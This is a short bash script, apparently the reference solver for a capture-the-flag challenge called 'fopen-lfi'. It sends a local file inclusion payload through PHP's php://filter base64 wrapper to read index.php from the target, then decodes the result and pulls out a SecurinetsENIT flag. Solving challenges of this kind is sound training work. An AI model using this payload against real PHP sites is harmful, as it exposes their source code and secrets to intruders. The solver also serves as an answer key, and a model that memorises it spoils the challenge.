#!/usr/bin/env bash
# 01 · fopen-lfi reference solver
# Usage: ./solve.sh http://TARGET:PORT
set -euo pipefail
BASE="${1:?usage: solve.sh http://host:port}"

echo "[*] Reading index.php through the php://filter wrapper..."
source="$(curl -fsS --get --data-urlencode 'page=php://filter/convert.base64-encode/resource=index' "${BASE}/")"
encoded="$(grep -oE '[A-Za-z0-9+/=]{100,}' <<<"$source" | tail -1 | tr -d '[:space:]')"
printf '%s' "$encoded" | base64 -d | grep -oE 'SecurinetsENIT\{[^}]+\}'
